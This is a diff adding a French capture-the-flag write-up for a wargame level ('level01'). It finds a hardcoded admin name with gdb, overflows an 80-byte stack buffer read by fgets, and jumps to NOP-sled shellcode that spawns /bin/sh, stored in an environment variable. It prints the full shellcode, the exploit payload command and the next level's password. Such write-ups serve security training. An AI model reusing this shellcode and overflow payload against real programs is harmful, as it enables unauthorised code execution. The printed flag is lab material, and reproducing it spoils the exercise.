@@ -1,0 +1,19 @@
+En lancant le binaire, on nous demande un nom d'adminitrateur, puis une verification.
+Nous passons le binaire sous gdb puis verifions la fonction verify_user_name. Nous voyons qu'il compare le nom avec dat_wil, et il y a aussi une fonction verify_user_pass, ou le mot de passe comparer est admin.
+Nous rentrons ces infos, mais on nous dit mot de passe incorrect. En regardant de plus pres le binaire, Nous voyons qu'il y a un sub de 0x60 et un lea de 0x10 ce qui nous laisse supposer que la variable ou est stocker le password s'écrit comme ceci: char pass[80].
+Ensuite, nous voyons dans le fget, que le second parametre est egale a 100. Donc nous pouvons overflow ce pointer. En faisant plusieurs tests, nous trouvons son offset qui est égale a 80.
+
+Apres, nous exportons un shellcode:
+export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
+
+Ensuite nous lancons le binaire sous gdb, mettons un break * main + 1 et le lancons.
+
+Puis nous lancons la commande x/200x $esp et localisons ainsi les \x90. Pour etre sur de tomber dedans nous prenons 0xffffd828 comme adresse.
+
+Puis nous avons simplement besoin de overflow et de mettre l'adresse du shellcode pour avoir acces au shell.
+
+python -c 'print "dat_wil\n" + "A" * 80 + "\x28\xd8\xff\xff"' > /tmp/jackpot
+
+cat /tmp/jackpot - | ./level01
+cd ../level02 && cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
